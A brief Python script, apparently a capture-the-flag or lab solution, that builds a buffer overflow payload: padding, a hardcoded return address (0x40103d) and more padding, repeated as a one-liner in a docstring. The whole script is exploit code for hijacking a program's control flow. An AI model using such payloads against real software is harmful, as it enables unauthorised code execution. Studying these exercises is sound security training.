#!/usr/bin/env python3

i = 16 
pad1 = 'A'*i
addr = '\x3d\x10\x40\x00\x00\x00\x00\x00'
pad2 = 'A'*(86 - len(pad1) - len(addr))
buff = pad1+addr+pad2
print(buff)


"""(python3 -c 'print("A"*16 + "\x3d\x10\x40\x00\x00\x00\x00\x00"+"A"*66)')   """